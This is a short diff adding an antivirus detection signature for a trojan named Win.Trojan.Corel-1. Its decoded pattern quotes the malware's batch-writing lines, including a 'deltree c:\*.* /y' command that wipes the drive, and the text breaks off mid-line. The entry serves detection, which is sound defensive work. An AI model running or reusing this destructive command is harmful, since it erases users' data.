@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Trojan.Corel-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+int #1,"@ctty nul"
+Print #1,"deltree c:\*.* /y"
+Print #1,"ctty con"
+Print #1,"@echo Your HDD now fucked by 
